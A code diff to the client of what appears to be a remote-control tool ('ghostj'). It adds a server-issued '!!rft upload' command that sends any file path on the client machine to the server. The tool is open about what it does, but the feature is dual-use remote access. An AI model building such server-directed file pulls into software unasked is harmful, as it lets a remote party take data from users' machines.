@@ -1,7 +1,9 @@
 package com.ghostj.client;
 
 import com.ghostj.util.TimeUtil;
+import com.rft.core.client.FileSender;
 import com.sun.xml.internal.bind.v2.TODO;
+import test.ClientTest;
 
 import java.io.*;
 import java.net.Socket;
@@ -127,7 +129,11 @@ public class HandleConn extends Thread{
                                         "      view         查看批处理文件内容\n" +
                                         "      add <命令...> 添加一行批处理命令\n" +
                                         "      run          执行批处理文件\n" +
-                                        "   *客户端侧批处理文件:只有一个批处理文件被客户端操作\n";
+                                        "   *客户端侧批处理文件:只有一个批处理文件被客户端操作\n" +
+                                        "\n" +
+                                        "!!rft <oper> [params..]  文件传输指令\n" +
+                                        "      oper列表:\n" +
+                                        "      upload <filePathOnClient> <savePathOnServer>  上传一个文件\n";
                                 ClientMain.bufferedWriter.write(helpinfo + "\n");
                                 ClientMain.bufferedWriter.flush();
                                 ClientMain.sendFinishToServer();
@@ -390,6 +396,25 @@ public class HandleConn extends Thread{
                                     }
                                     default:{
                                         writeToServer("!!bat 命令语法不正确\n");
+                                        continue readMsg;
+                                    }
+                                }
+                            }
+                            /**
+                             * 上传文件
+                             */
+                            case "!!rft":{
+                                if(cmd0.length<2){
+                                    writeToServer("!!rft 命令语法不正确");
+                                    continue readMsg;
+                                }
+                                switch (cmd0[1]){
+                                    case "upload":{//!!rft upload <filePath> <savePath>
+                                        if(cmd0.length<4){
+                                            writeToServer("!!rft upload 命令语法不正确");
+                                            continue readMsg;
+                                        }
+                                        FileSender.sendFile(new File(cmd0[2]),cmd0[3],new Date().getTime()+"", ClientMain.ip,ClientMain.rft_port);
                                         continue readMsg;
                                     }
                                 }
